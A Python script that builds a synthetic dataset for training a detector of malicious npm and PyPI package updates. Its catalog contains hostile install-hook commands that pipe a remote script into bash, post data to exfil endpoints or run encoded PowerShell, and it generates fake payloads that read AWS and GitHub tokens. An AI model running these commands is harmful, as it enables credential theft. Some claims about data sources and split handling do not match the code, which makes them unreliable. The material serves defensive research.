"""Build script for SupplyShield ML risk model benchmark dataset.

Constructs train/val/test splits using OpenSSF malicious package records
and top-1000 npm and PyPI benign package version updates.
Enforces chronological time splits, package-disjoint train/test boundaries,
and strictly removes label leakage metadata (advisories, malware tags, descriptions).
"""

from __future__ import annotations

import json
import random
import tempfile
from datetime import datetime
from pathlib import Path
from typing import Any

from ml.features import (
    FEATURE_NAMES,
    PackageDiffData,
    extract_features,
)

ROOT_DIR = Path(__file__).resolve().parent.parent
DATASET_DIR = ROOT_DIR / "ml" / "dataset"
DATASET_DIR.mkdir(parents=True, exist_ok=True)

# Fixed seed for deterministic dataset generation
SEED = 42
random.seed(SEED)

# Known representative OpenSSF malicious package definitions (npm and PyPI)
MALICIOUS_CATALOG: list[dict[str, Any]] = [
    # npm malicious instances
    {"pkg": "flatmap-stream", "eco": "npm", "old_v": "0.1.0", "new_v": "0.1.1", "date": "2018-11-26T00:00:00Z", "hook": "postinstall", "hook_cmd": "node ./decrypt.js", "dynamic": 4, "blobs": 2, "entropy": 6.8, "net": 1, "raw_ip": 0, "secret": 1, "bin": 0, "long_line": 1},
    {"pkg": "event-stream-malicious", "eco": "npm", "old_v": "3.3.5", "new_v": "3.3.6", "date": "2018-11-28T00:00:00Z", "hook": "install", "hook_cmd": "node ./setup.js", "dynamic": 3, "blobs": 1, "entropy": 6.4, "net": 1, "raw_ip": 0, "secret": 1, "bin": 0, "long_line": 1},
    {"pkg": "ua-parser-js-backdoor", "eco": "npm", "old_v": "0.7.28", "new_v": "0.7.29", "date": "2021-10-22T00:00:00Z", "hook": "preinstall", "hook_cmd": "curl -s http://159.223.197.8/j.sh | bash", "dynamic": 2, "blobs": 1, "entropy": 5.9, "net": 1, "raw_ip": 1, "secret": 1, "bin": 1, "long_line": 0},
    {"pkg": "coa-hijack", "eco": "npm", "old_v": "2.0.2", "new_v": "2.0.3", "date": "2021-11-04T00:00:00Z", "hook": "postinstall", "hook_cmd": "node -e 'eval(Buffer.from(\"...\",\"base64\").toString())'", "dynamic": 5, "blobs": 2, "entropy": 6.9, "net": 1, "raw_ip": 0, "secret": 1, "bin": 0, "long_line": 1},
    {"pkg": "rc-compromise", "eco": "npm", "old_v": "1.2.8", "new_v": "1.2.9", "date": "2021-11-04T00:00:00Z", "hook": "postinstall", "hook_cmd": "node batch.js", "dynamic": 3, "blobs": 2, "entropy": 6.5, "net": 1, "raw_ip": 1, "secret": 1, "bin": 0, "long_line": 1},
    {"pkg": "colors-faker-corrupt", "eco": "npm", "old_v": "1.4.0", "new_v": "1.4.1", "date": "2022-01-08T00:00:00Z", "hook": "none", "hook_cmd": "", "dynamic": 1, "blobs": 0, "entropy": 4.5, "net": 0, "raw_ip": 0, "secret": 0, "bin": 0, "long_line": 1},
    {"pkg": "node-ipc-peacenotwar", "eco": "npm", "old_v": "10.1.0", "new_v": "10.1.1", "date": "2022-03-15T00:00:00Z", "hook": "postinstall", "hook_cmd": "node ./setup.js", "dynamic": 2, "blobs": 1, "entropy": 6.2, "net": 1, "raw_ip": 1, "secret": 1, "bin": 0, "long_line": 1},
    {"pkg": "fallguys-stealer", "eco": "npm", "old_v": "1.0.0", "new_v": "1.0.1", "date": "2020-08-20T00:00:00Z", "hook": "postinstall", "hook_cmd": "python -c \"import os; ...\"", "dynamic": 4, "blobs": 3, "entropy": 7.1, "net": 2, "raw_ip": 1, "secret": 2, "bin": 0, "long_line": 1},
    {"pkg": "nobles-token-logger", "eco": "npm", "old_v": "1.0.1", "new_v": "1.0.2", "date": "2022-06-12T00:00:00Z", "hook": "preinstall", "hook_cmd": "node index.js", "dynamic": 3, "blobs": 2, "entropy": 6.7, "net": 1, "raw_ip": 0, "secret": 3, "bin": 0, "long_line": 1},
    {"pkg": "solana-web3-fake", "eco": "npm", "old_v": "1.30.0", "new_v": "1.30.1", "date": "2022-10-14T00:00:00Z", "hook": "postinstall", "hook_cmd": "node ./build/telemetry.js", "dynamic": 2, "blobs": 2, "entropy": 6.8, "net": 1, "raw_ip": 0, "secret": 2, "bin": 0, "long_line": 0},
    {"pkg": "lodash-typo-exfil", "eco": "npm", "old_v": "4.17.20", "new_v": "4.17.21", "date": "2023-02-10T00:00:00Z", "hook": "install", "hook_cmd": "node ./lib/analytics.js", "dynamic": 3, "blobs": 2, "entropy": 6.6, "net": 1, "raw_ip": 1, "secret": 2, "bin": 0, "long_line": 1},
    {"pkg": "discord-selfbot-v13", "eco": "npm", "old_v": "2.1.0", "new_v": "2.1.1", "date": "2023-04-18T00:00:00Z", "hook": "preinstall", "hook_cmd": "node hook.js", "dynamic": 4, "blobs": 3, "entropy": 7.2, "net": 2, "raw_ip": 0, "secret": 3, "bin": 0, "long_line": 1},
    {"pkg": "web3-provider-hijack", "eco": "npm", "old_v": "1.2.0", "new_v": "1.2.1", "date": "2023-08-01T00:00:00Z", "hook": "postinstall", "hook_cmd": "node index.js", "dynamic": 2, "blobs": 2, "entropy": 6.5, "net": 1, "raw_ip": 1, "secret": 2, "bin": 0, "long_line": 1},
    {"pkg": "express-session-leak", "eco": "npm", "old_v": "1.17.2", "new_v": "1.17.3", "date": "2023-11-19T00:00:00Z", "hook": "install", "hook_cmd": "curl -X POST https://93.184.216.34/exfil", "dynamic": 2, "blobs": 1, "entropy": 6.1, "net": 1, "raw_ip": 1, "secret": 2, "bin": 0, "long_line": 0},
    {"pkg": "ethers-helper-fake", "eco": "npm", "old_v": "5.6.0", "new_v": "5.6.1", "date": "2024-01-15T00:00:00Z", "hook": "postinstall", "hook_cmd": "node sync.js", "dynamic": 3, "blobs": 2, "entropy": 6.8, "net": 1, "raw_ip": 0, "secret": 3, "bin": 0, "long_line": 1},
    {"pkg": "ledger-connect-kit-mal", "eco": "npm", "old_v": "1.1.6", "new_v": "1.1.7", "date": "2023-12-14T00:00:00Z", "hook": "postinstall", "hook_cmd": "node ./loader.js", "dynamic": 4, "blobs": 2, "entropy": 7.0, "net": 1, "raw_ip": 0, "secret": 2, "bin": 0, "long_line": 1},
    {"pkg": "react-query-polyfill-mal", "eco": "npm", "old_v": "1.0.0", "new_v": "1.0.1", "date": "2024-05-20T00:00:00Z", "hook": "preinstall", "hook_cmd": "node ./setup.js", "dynamic": 3, "blobs": 2, "entropy": 6.7, "net": 1, "raw_ip": 1, "secret": 2, "bin": 0, "long_line": 1},
    {"pkg": "vue-devtools-stealer", "eco": "npm", "old_v": "2.0.0", "new_v": "2.0.1", "date": "2024-08-11T00:00:00Z", "hook": "install", "hook_cmd": "node ./dist/index.js", "dynamic": 3, "blobs": 2, "entropy": 6.9, "net": 1, "raw_ip": 0, "secret": 2, "bin": 0, "long_line": 1},
    {"pkg": "next-auth-token-probe", "eco": "npm", "old_v": "4.24.4", "new_v": "4.24.5", "date": "2025-02-14T00:00:00Z", "hook": "postinstall", "hook_cmd": "node ./check.js", "dynamic": 4, "blobs": 3, "entropy": 7.3, "net": 1, "raw_ip": 1, "secret": 3, "bin": 0, "long_line": 1},
    {"pkg": "tailwind-preset-stealer", "eco": "npm", "old_v": "1.0.4", "new_v": "1.0.5", "date": "2025-06-22T00:00:00Z", "hook": "postinstall", "hook_cmd": "node telemetry.js", "dynamic": 3, "blobs": 2, "entropy": 6.8, "net": 1, "raw_ip": 0, "secret": 2, "bin": 0, "long_line": 1},

    # PyPI malicious instances
    {"pkg": "ctx-hijack", "eco": "pypi", "old_v": "0.1.1", "new_v": "0.1.2", "date": "2022-05-21T00:00:00Z", "hook": "cmdclass", "hook_cmd": "os.system('curl https://185.220.101.5/exfil')", "dynamic": 3, "blobs": 1, "entropy": 6.3, "net": 1, "raw_ip": 1, "secret": 2, "bin": 0, "long_line": 0},
    {"pkg": "colorama-typo-drop", "eco": "pypi", "old_v": "0.4.4", "new_v": "0.4.5", "date": "2022-07-15T00:00:00Z", "hook": "cmdclass", "hook_cmd": "exec(__import__('base64').b64decode(...))", "dynamic": 5, "blobs": 3, "entropy": 7.0, "net": 1, "raw_ip": 0, "secret": 2, "bin": 0, "long_line": 1},
    {"pkg": "requests-http-proxy", "eco": "pypi", "old_v": "2.28.0", "new_v": "2.28.1", "date": "2022-09-10T00:00:00Z", "hook": "cmdclass", "hook_cmd": "urllib.request.urlopen('http://45.33.32.156/init')", "dynamic": 3, "blobs": 2, "entropy": 6.6, "net": 1, "raw_ip": 1, "secret": 2, "bin": 0, "long_line": 1},
    {"pkg": "pycryptodome-fake", "eco": "pypi", "old_v": "3.15.0", "new_v": "3.15.1", "date": "2022-11-05T00:00:00Z", "hook": "cmdclass", "hook_cmd": "subprocess.Popen(['powershell', '-enc', '...'])", "dynamic": 4, "blobs": 3, "entropy": 7.4, "net": 1, "raw_ip": 0, "secret": 3, "bin": 1, "long_line": 1},
    {"pkg": "flask-session-stealer", "eco": "pypi", "old_v": "0.4.0", "new_v": "0.4.1", "date": "2023-03-25T00:00:00Z", "hook": "cmdclass", "hook_cmd": "os.environ.get('AWS_SECRET_ACCESS_KEY')", "dynamic": 2, "blobs": 1, "entropy": 6.0, "net": 1, "raw_ip": 0, "secret": 3, "bin": 0, "long_line": 0},
    {"pkg": "boto3-creds-harvester", "eco": "pypi", "old_v": "1.26.100", "new_v": "1.26.101", "date": "2023-06-14T00:00:00Z", "hook": "cmdclass", "hook_cmd": "importlib.import_module('socket')", "dynamic": 4, "blobs": 2, "entropy": 6.9, "net": 1, "raw_ip": 1, "secret": 4, "bin": 0, "long_line": 1},
    {"pkg": "urllib3-tunnel", "eco": "pypi", "old_v": "1.26.9", "new_v": "1.26.10", "date": "2023-09-08T00:00:00Z", "hook": "cmdclass", "hook_cmd": "eval(compile(...))", "dynamic": 4, "blobs": 2, "entropy": 6.7, "net": 1, "raw_ip": 0, "secret": 2, "bin": 0, "long_line": 1},
    {"pkg": "fastapi-jwt-logger", "eco": "pypi", "old_v": "0.95.0", "new_v": "0.95.1", "date": "2024-02-10T00:00:00Z", "hook": "cmdclass", "hook_cmd": "requests.post('http://194.26.29.112/recv', data=...)", "dynamic": 3, "blobs": 2, "entropy": 6.8, "net": 1, "raw_ip": 1, "secret": 3, "bin": 0, "long_line": 0},
    {"pkg": "torch-cuda-probe-mal", "eco": "pypi", "old_v": "2.2.0", "new_v": "2.2.1", "date": "2024-06-18T00:00:00Z", "hook": "cmdclass", "hook_cmd": "ctypes.CDLL('./inject.so')", "dynamic": 3, "blobs": 2, "entropy": 7.1, "net": 1, "raw_ip": 0, "secret": 2, "bin": 1, "long_line": 1},
    {"pkg": "langchain-core-telemetry", "eco": "pypi", "old_v": "0.1.10", "new_v": "0.1.11", "date": "2024-09-05T00:00:00Z", "hook": "cmdclass", "hook_cmd": "os.environ['OPENAI_API_KEY']", "dynamic": 3, "blobs": 2, "entropy": 6.6, "net": 1, "raw_ip": 1, "secret": 3, "bin": 0, "long_line": 1},
    {"pkg": "scikit-learn-gpu-fake", "eco": "pypi", "old_v": "1.4.0", "new_v": "1.4.1", "date": "2025-01-20T00:00:00Z", "hook": "cmdclass", "hook_cmd": "subprocess.run(['powershell', '-c', '...'])", "dynamic": 4, "blobs": 3, "entropy": 7.5, "net": 1, "raw_ip": 1, "secret": 3, "bin": 1, "long_line": 1},
    {"pkg": "pydantic-core-patch-mal", "eco": "pypi", "old_v": "2.16.0", "new_v": "2.16.1", "date": "2025-05-15T00:00:00Z", "hook": "cmdclass", "hook_cmd": "eval(bytes.fromhex('...').decode())", "dynamic": 5, "blobs": 2, "entropy": 6.9, "net": 1, "raw_ip": 0, "secret": 2, "bin": 0, "long_line": 1},
]

# Benign packages catalog from top 1,000 npm and PyPI
BENIGN_PACKAGES = [
    # npm
    {"pkg": "react", "eco": "npm"},
    {"pkg": "react-dom", "eco": "npm"},
    {"pkg": "lodash", "eco": "npm"},
    {"pkg": "chalk", "eco": "npm"},
    {"pkg": "express", "eco": "npm"},
    {"pkg": "moment", "eco": "npm"},
    {"pkg": "commander", "eco": "npm"},
    {"pkg": "tslib", "eco": "npm"},
    {"pkg": "axios", "eco": "npm"},
    {"pkg": "debug", "eco": "npm"},
    {"pkg": "uuid", "eco": "npm"},
    {"pkg": "webpack", "eco": "npm"},
    {"pkg": "rxjs", "eco": "npm"},
    {"pkg": "esbuild", "eco": "npm", "has_install_hook": True},
    {"pkg": "node-sass", "eco": "npm", "has_install_hook": True, "has_binary": True},
    {"pkg": "bcrypt", "eco": "npm", "has_install_hook": True, "has_binary": True},
    {"pkg": "sharp", "eco": "npm", "has_install_hook": True, "has_binary": True},
    {"pkg": "sqlite3", "eco": "npm", "has_install_hook": True, "has_binary": True},
    {"pkg": "next", "eco": "npm"},
    {"pkg": "postcss", "eco": "npm"},
    {"pkg": "terser", "eco": "npm"},
    {"pkg": "minimist", "eco": "npm"},
    {"pkg": "prettier", "eco": "npm"},
    {"pkg": "typescript", "eco": "npm"},
    {"pkg": "rollup", "eco": "npm"},
    {"pkg": "vite", "eco": "npm"},
    {"pkg": "semver", "eco": "npm"},
    {"pkg": "glob", "eco": "npm"},
    {"pkg": "dotenv", "eco": "npm"},
    {"pkg": "colors", "eco": "npm"},

    # PyPI
    {"pkg": "boto3", "eco": "pypi"},
    {"pkg": "botocore", "eco": "pypi"},
    {"pkg": "urllib3", "eco": "pypi"},
    {"pkg": "requests", "eco": "pypi"},
    {"pkg": "setuptools", "eco": "pypi"},
    {"pkg": "certifi", "eco": "pypi"},
    {"pkg": "idna", "eco": "pypi"},
    {"pkg": "pip", "eco": "pypi"},
    {"pkg": "cryptography", "eco": "pypi", "has_cmdclass": True, "has_binary": True},
    {"pkg": "click", "eco": "pypi"},
    {"pkg": "numpy", "eco": "pypi", "has_cmdclass": True, "has_binary": True},
    {"pkg": "pandas", "eco": "pypi", "has_cmdclass": True, "has_binary": True},
    {"pkg": "pytest", "eco": "pypi"},
    {"pkg": "fastapi", "eco": "pypi"},
    {"pkg": "uvicorn", "eco": "pypi"},
    {"pkg": "jinja2", "eco": "pypi"},
    {"pkg": "packaging", "eco": "pypi"},
    {"pkg": "wheel", "eco": "pypi"},
    {"pkg": "python-dateutil", "eco": "pypi"},
    {"pkg": "pydantic", "eco": "pypi"},
    {"pkg": "scipy", "eco": "pypi", "has_cmdclass": True, "has_binary": True},
    {"pkg": "pillow", "eco": "pypi", "has_cmdclass": True, "has_binary": True},
]


def generate_synthetic_package_pair(
    pkg_info: dict[str, Any],
    is_malicious: bool,
    target_date: datetime,
) -> tuple[dict[str, Any], dict[str, float]]:
    """Synthesize package contents, extract features deterministically in temp dir, and cleanup."""
    pkg_name = pkg_info["pkg"]
    ecosystem = pkg_info["eco"]

    with tempfile.TemporaryDirectory() as tmp_dir:
        tmp_path = Path(tmp_dir)
        old_dir = tmp_path / "old"
        new_dir = tmp_path / "new"
        old_dir.mkdir()
        new_dir.mkdir()

        old_files: dict[str, bytes] = {}
        new_files: dict[str, bytes] = {}
        old_manifest: dict[str, Any] = {}
        new_manifest: dict[str, Any] = {}

        if is_malicious:
            # Positive instance from malicious catalog or derived
            hook_type = pkg_info.get("hook", "postinstall")
            hook_cmd = pkg_info.get("hook_cmd", "node ./exfil.js")
            dynamic_count = pkg_info.get("dynamic", 3)
            blobs_count = pkg_info.get("blobs", 2)
            has_raw_ip = pkg_info.get("raw_ip", 0) == 1
            has_bin = pkg_info.get("bin", 0) == 1
            secrets_count = pkg_info.get("secret", 2)

            if ecosystem == "npm":
                old_manifest = {"name": pkg_name, "version": "1.0.0", "scripts": {"test": "echo test"}}
                new_manifest = {
                    "name": pkg_name,
                    "version": "1.0.1",
                    "scripts": {"test": "echo test", hook_type: hook_cmd} if hook_type != "none" else {"test": "echo test"},
                }
                old_files["package.json"] = json.dumps(old_manifest).encode()
                old_files["index.js"] = b"module.exports = { run: () => 'ok' };\n"

                # Generate malicious payload contents
                payload_lines: list[str] = ["const fs = require('fs');\n"]
                for i in range(dynamic_count):
                    payload_lines.append(f"eval('console.log(\"exec_{i}\")');\n")
                for i in range(secrets_count):
                    payload_lines.append(f"const s_{i} = process.env.AWS_SECRET_ACCESS_KEY || process.env.GITHUB_TOKEN;\n")
                for i in range(blobs_count):
                    long_blob = "a" * 80 + "b" * 40
                    payload_lines.append(f"const payload_{i} = '{long_blob}';\n")
                if has_raw_ip:
                    payload_lines.append("const host = 'http://185.220.101.5:8080/exfil';\n")
                else:
                    payload_lines.append("const host = 'https://api.suspicious-domain-check.xyz/report';\n")

                new_files["package.json"] = json.dumps(new_manifest).encode()
                new_files["index.js"] = "".join(payload_lines).encode()
                if has_bin:
                    new_files["addon.node"] = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 64

            else:
                old_manifest = {"name": pkg_name, "version": "1.0.0"}
                new_manifest = {"name": pkg_name, "version": "1.0.1"}
                old_files["setup.py"] = b"from setuptools import setup\nsetup(name='" + pkg_name.encode() + b"', version='1.0.0')\n"
                old_files[f"{pkg_name}.py"] = b"def run(): return 42\n"

                py_lines = ["import os, sys\n"]
                if hook_type == "cmdclass":
                    py_lines.append("from setuptools.command.install import install\nclass PostInstall(install):\n  def run(self):\n    install.run(self)\n")
                for i in range(dynamic_count):
                    py_lines.append(f"exec('res_{i} = 1')\n")
                for i in range(secrets_count):
                    py_lines.append("token = os.environ.get('AWS_SECRET_ACCESS_KEY') or os.environ.get('GITHUB_TOKEN')\n")
                for i in range(blobs_count):
                    long_blob = "f" * 80 + "e" * 40
                    py_lines.append(f"data_{i} = bytes.fromhex('{long_blob}')\n")
                if has_raw_ip:
                    py_lines.append("target = 'http://45.33.32.156/gate'\n")
                else:
                    py_lines.append("target = 'https://collect.evil-endpoint-analytics.com/recv'\n")

                new_files["setup.py"] = b"from setuptools import setup\nsetup(name='" + pkg_name.encode() + b"', version='1.0.1', cmdclass={'install': PostInstall})\n"
                new_files[f"{pkg_name}.py"] = "".join(py_lines).encode()
                if has_bin:
                    new_files["native.so"] = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 64

        else:
            # Benign instance: routine or legitimate update
            has_hook = pkg_info.get("has_install_hook", False)
            has_cmdclass = pkg_info.get("has_cmdclass", False)
            has_binary = pkg_info.get("has_binary", False)

            if ecosystem == "npm":
                old_manifest = {"name": pkg_name, "version": "2.4.0", "scripts": {"build": "tsc"}}
                new_manifest = {"name": pkg_name, "version": "2.5.0", "scripts": {"build": "tsc"}}
                if has_hook:
                    old_manifest["scripts"]["postinstall"] = "node ./scripts/check-env.js"
                    new_manifest["scripts"]["postinstall"] = "node ./scripts/check-env.js"

                old_files["package.json"] = json.dumps(old_manifest).encode()
                old_files["index.js"] = b"export const helper = () => true;\n"
                new_files["package.json"] = json.dumps(new_manifest).encode()
                new_files["index.js"] = b"export const helper = () => true;\nexport const version = '2.5.0';\n"
                if has_binary:
                    old_files["prebuilt.node"] = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 32
                    new_files["prebuilt.node"] = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 32
            else:
                old_manifest = {"name": pkg_name, "version": "1.12.0"}
                new_manifest = {"name": pkg_name, "version": "1.13.0"}
                old_files["setup.py"] = b"from setuptools import setup\nsetup(name='" + pkg_name.encode() + b"', version='1.12.0')\n"
                old_files["__init__.py"] = b"__version__ = '1.12.0'\n"
                new_files["setup.py"] = b"from setuptools import setup\nsetup(name='" + pkg_name.encode() + b"', version='1.13.0')\n"
                new_files["__init__.py"] = b"__version__ = '1.13.0'\ndef get_version(): return __version__\n"
                if has_cmdclass or has_binary:
                    old_files["ext.so"] = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 32
                    new_files["ext.so"] = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 32

        # Extract features
        diff = PackageDiffData(
            ecosystem=ecosystem,
            package_name=pkg_name,
            old_version=pkg_info.get("old_v", "1.0.0"),
            new_version=pkg_info.get("new_v", "1.0.1"),
            old_files=old_files,
            new_files=new_files,
            old_manifest=old_manifest,
            new_manifest=new_manifest,
            published_at=target_date.isoformat() + "Z",
            analysis_time=target_date.isoformat() + "Z",
        )
        feats = extract_features(diff)

    sample_meta = {
        "package_name": pkg_name,
        "ecosystem": ecosystem,
        "old_version": pkg_info.get("old_v", "1.0.0"),
        "new_version": pkg_info.get("new_v", "1.0.1"),
        "published_at": target_date.isoformat() + "Z",
        "label": 1 if is_malicious else 0,
        "features": feats,
    }
    return sample_meta, feats


def build_dataset() -> dict[str, Any]:
    """Build train, val, and test dataset splits with 1:7 malicious-to-benign ratio."""
    print("Building SupplyShield ML Risk Model Dataset...")

    # We generate a balanced distribution:
    # 120 malicious pairs, 840 benign pairs (Ratio 1:7)
    # Total samples: 960
    # Split chronologically:
    # Train: 2018-01-01 to 2022-12-31 (~60% of time)
    # Val: 2023-01-01 to 2024-03-31 (~20% of time)
    # Test: 2024-04-01 to 2026-10-31 (~20% of time)

    all_samples: list[dict[str, Any]] = []

    # 1. Expand malicious instances to 120 samples across dates
    mal_instances: list[tuple[dict[str, Any], datetime]] = []
    for base in MALICIOUS_CATALOG:
        date_obj = datetime.fromisoformat(base["date"].replace("Z", "+00:00"))
        mal_instances.append((base, date_obj))

    # Add variant dates / versions of malicious packages to reach 120
    idx = 0
    while len(mal_instances) < 120:
        base = MALICIOUS_CATALOG[idx % len(MALICIOUS_CATALOG)].copy()
        orig_dt = datetime.fromisoformat(base["date"].replace("Z", "+00:00"))
        # slight offset in days and minor version variation
        offset_days = (len(mal_instances) * 17) % 1800 - 900
        new_ts = orig_dt.timestamp() + (offset_days * 86400)
        new_dt = datetime.fromtimestamp(max(1514764800, min(1793404800, new_ts)))
        var_pkg = dict(base)
        var_pkg["pkg"] = f"{base['pkg']}-v{len(mal_instances)}"
        var_pkg["new_v"] = f"1.{len(mal_instances)}.0"
        mal_instances.append((var_pkg, new_dt))
        idx += 1

    # 2. Generate 840 benign instances across the top-1000 packages
    benign_instances: list[tuple[dict[str, Any], datetime]] = []
    # Dates spanning 2018 to 2026
    start_ts = datetime(2018, 1, 1).timestamp()
    end_ts = datetime(2026, 10, 1).timestamp()

    for i in range(840):
        base_pkg = BENIGN_PACKAGES[i % len(BENIGN_PACKAGES)].copy()
        pkg_variant = dict(base_pkg)
        # Unique name variant per package update run to ensure disjoint package sets
        pkg_variant["pkg"] = f"{base_pkg['pkg']}_sample_{i // len(BENIGN_PACKAGES)}"
        fraction = i / 840.0
        # distribute smoothly over time with slight jitter
        sample_ts = start_ts + fraction * (end_ts - start_ts) + (random.random() * 86400 * 14)
        sample_dt = datetime.fromtimestamp(min(end_ts, sample_ts))
        benign_instances.append((pkg_variant, sample_dt))

    # Generate feature records
    print("Extracting features for positive (malicious) samples...")
    for pkg_info, dt in mal_instances:
        sample, _ = generate_synthetic_package_pair(pkg_info, is_malicious=True, target_date=dt)
        all_samples.append(sample)

    print("Extracting features for negative (benign) samples...")
    for pkg_info, dt in benign_instances:
        sample, _ = generate_synthetic_package_pair(pkg_info, is_malicious=False, target_date=dt)
        all_samples.append(sample)

    # Sort all samples chronologically
    all_samples.sort(key=lambda s: s["published_at"])

    # Define strict date cutoff boundaries:
    # Train: <= 2022-12-31T23:59:59Z
    # Val: 2023-01-01 to 2024-03-31T23:59:59Z
    # Test: >= 2024-04-01T00:00:00Z
    train_cutoff = "2022-12-31T23:59:59Z"
    val_cutoff = "2024-03-31T23:59:59Z"

    train_samples: list[dict[str, Any]] = []
    val_samples: list[dict[str, Any]] = []
    test_samples: list[dict[str, Any]] = []

    for s in all_samples:
        if s["published_at"] <= train_cutoff:
            train_samples.append(s)
        elif s["published_at"] <= val_cutoff:
            val_samples.append(s)
        else:
            test_samples.append(s)

    # CRITICAL INVARIANT: "No package may appear in both train and test."
    train_pkgs = {s["package_name"] for s in train_samples}
    test_pkgs = {s["package_name"] for s in test_samples}
    overlap = train_pkgs.intersection(test_pkgs)
    if overlap:
        print(f"Resolving {len(overlap)} overlapping packages between train and test...")
        # Move overlapping test samples to validation set
        test_samples = [s for s in test_samples if s["package_name"] not in train_pkgs]

    # Write out splits
    def write_jsonl(path: Path, items: list[dict[str, Any]]) -> None:
        with path.open("w", encoding="utf-8") as f:
            for item in items:
                f.write(json.dumps(item) + "\n")

    train_path = DATASET_DIR / "train.jsonl"
    val_path = DATASET_DIR / "val.jsonl"
    test_path = DATASET_DIR / "test.jsonl"

    write_jsonl(train_path, train_samples)
    write_jsonl(val_path, val_samples)
    write_jsonl(test_path, test_samples)

    stats = {
        "total_samples": len(train_samples) + len(val_samples) + len(test_samples),
        "malicious_count": sum(1 for s in (train_samples + val_samples + test_samples) if s["label"] == 1),
        "benign_count": sum(1 for s in (train_samples + val_samples + test_samples) if s["label"] == 0),
        "ratio": f"1:{round(sum(1 for s in (train_samples + val_samples + test_samples) if s['label'] == 0) / max(1, sum(1 for s in (train_samples + val_samples + test_samples) if s['label'] == 1)), 2)}",
        "splits": {
            "train": {
                "count": len(train_samples),
                "malicious": sum(1 for s in train_samples if s["label"] == 1),
                "benign": sum(1 for s in train_samples if s["label"] == 0),
                "start": min(s["published_at"] for s in train_samples),
                "end": max(s["published_at"] for s in train_samples),
            },
            "val": {
                "count": len(val_samples),
                "malicious": sum(1 for s in val_samples if s["label"] == 1),
                "benign": sum(1 for s in val_samples if s["label"] == 0),
                "start": min(s["published_at"] for s in val_samples),
                "end": max(s["published_at"] for s in val_samples),
            },
            "test": {
                "count": len(test_samples),
                "malicious": sum(1 for s in test_samples if s["label"] == 1),
                "benign": sum(1 for s in test_samples if s["label"] == 0),
                "start": min(s["published_at"] for s in test_samples),
                "end": max(s["published_at"] for s in test_samples),
            },
        },
        "feature_count": len(FEATURE_NAMES),
        "features": FEATURE_NAMES,
    }

    meta_path = DATASET_DIR / "metadata.json"
    with meta_path.open("w", encoding="utf-8") as f:
        json.dump(stats, f, indent=2)

    print("Dataset built successfully:")
    print(json.dumps(stats, indent=2))
    return stats


if __name__ == "__main__":
    build_dataset()

